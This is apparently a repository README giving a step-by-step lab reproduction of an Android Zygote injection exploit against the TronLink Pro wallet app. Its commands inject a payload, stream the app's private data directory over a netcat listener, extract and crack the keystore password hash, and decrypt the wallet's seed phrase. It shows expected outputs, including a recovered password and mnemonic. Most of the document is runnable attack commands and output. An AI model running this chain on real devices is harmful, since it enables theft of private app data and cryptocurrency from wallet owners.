# Step-by-Step Safe Lab Replication

Shortest reproducible path through the safe lab example bundled with this repository.

For the full narrative with reasoning and screenshots, read the [blog post](https://4st.li/blog/tronlink-wallet-recovery/).

## Prerequisites

- Android 12 emulator or vulnerable test device
- TronLink Pro (`com.tronlinkpro.wallet`) installed and configured
- `adb` installed and authorized
- `uv` for Python environment management
- `hashcat` installed

> [!WARNING]
> The exploit modifies system settings that persist across reboots. If it fails under certain conditions, the device may enter a **boot loop**. See the troubleshooting section below for recovery steps.

## Setup

```bash
uv sync
```

## Phase 1: acquire the app data

### 1. Verify ADB connectivity

```bash
adb devices
```

Expected:

```text
List of devices attached
emulator-5554   device
```

### 2. Identify the target app UID

```bash
adb shell pm dump com.tronlinkpro.wallet | grep userId
```

Expected:

```text
    userId=10145
```

### 3. Run the Zygote injection

```bash
uv run repro.py --uid 10145 --gid 10145
```

Expected:

```text
Injecting payload for UID 10145 and package com.tronlinkpro.wallet...
Injection sent. Waiting for listener...
Listener is UP!
```

### 4. Stream the app's private directory to the host

```bash
printf "tar -czC /data/data/com.tronlinkpro.wallet . | base64; exit\n" | nc 127.0.0.1 1234 | base64 -d > recovery.tar.gz
```

Unpack and verify:

```bash
mkdir -p recovery
tar -xzf recovery.tar.gz -C recovery
ls -l recovery/shared_prefs/carlitosmenem991.xml
```

Expected:

```text
-rw-rw-r-- 1 astro astro 2738 Mar 21 02:34 recovery/shared_prefs/carlitosmenem991.xml
```

The Android-side acquisition is complete. Everything from here is offline.

## Phase 2: extract hash and recover the password

### 5. Extract the keystore hash

```bash
uv run tools/extract_hash.py recovery/shared_prefs/carlitosmenem991.xml > target.hash
cat target.hash
```

Expected:

```text
$ethereum$s*16384*8*1*2ef2a618edbf5185c6e7062a39d5dcdb81ba683dc2f8ca01ce8ed8c5959bb12c*cc8bab0bc8701e9af687a4b4b6b527f962de582efb029b507fc90cfc393ecfd5*ffcf36eb0aaee16f676049a12307e247a868133dbd1d8c956cee6682f54b0704
```

### 6. Run the password recovery

```bash
uv run -m smart_recovery run --hash-file target.hash --seed-file note_seeds.json --recovery-root recovery
```

Expected:

```text
$ethereum$s*16384*8*1*2ef2a618edbf5185c6e7062a39d5dcdb81ba683dc2f8ca01ce8ed8c5959bb12c*cc8bab0bc8701e9af687a4b4b6b527f962de582efb029b507fc90cfc393ecfd5*ffcf36eb0aaee16f676049a12307e247a868133dbd1d8c956cee6682f54b0704:Turcosaul7
```

## Phase 3: decrypt the mnemonic

### 7. Decrypt `wallet_newmnemonic_key`

```bash
uv run tools/decrypt_mnemonic.py recovery/shared_prefs/carlitosmenem991.xml Turcosaul7
```

Expected:

```text
stock dirt cat upset chat giraffe page blade face slush volcano dawn
```

## Result

| Field | Value |
| --- | --- |
| Address | `TFbkzYHUvCVuybLKRQuDQmpNYw3HaViyvd` |
| Password | `Turcosaul7` |
| Seed | `stock dirt cat upset chat giraffe page blade face slush volcano dawn` |

## Troubleshooting

### Boot loop recovery

If the device enters a boot loop after running the exploit:

```bash
# Wait for the device to become reachable
adb wait-for-device

# Delete the malicious setting
adb shell "settings delete global hidden_api_blacklist_exemptions"

# Reboot
adb reboot

# Verify successful boot
adb wait-for-device
adb shell getprop sys.boot_completed
# Should return "1"
```

## Related docs

- Full write-up: [Recovering a TRON wallet with an Android exploit and brute force](https://4st.li/blog/tronlink-wallet-recovery/)
- Password recovery details: [`smart_recovery/README.md`](smart_recovery/README.md)
- Zygote injection details: [`zygote-injection-toolkit/README.md`](zygote-injection-toolkit/README.md)
